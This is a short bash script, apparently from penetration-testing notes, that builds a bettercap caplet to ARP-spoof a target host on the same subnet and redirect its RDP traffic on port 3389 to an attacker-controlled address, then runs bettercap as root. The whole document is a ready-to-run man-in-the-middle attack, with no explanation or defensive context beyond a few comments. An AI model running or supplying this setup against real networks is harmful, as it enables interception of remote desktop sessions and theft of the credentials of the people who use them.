```bash
export VICTIM_IP="192.168.254.102"
export ATTACKER_IP="192.168.254.101"
cat > rdp.cap << eof
set arp.spoof.targets $VICTIM_IP
# internal is required because client and server are in the same subnets
# otherwise bettercap only spoofs gateway ip
set arp.spoof.internal true
arp.spoof on

set any.proxy.src_port 3389
set any.proxy.dst_port 3389
# attacker ip address
set any.proxy.dst_address $ATTACKER_IP
any.proxy on
eof
ping -c 1 -w 1 "$VICTIM_IP" # try to put arp address in cache to silence bettercap warnings
sudo bettercap -iface eth0 -caplet rdp.cap
```
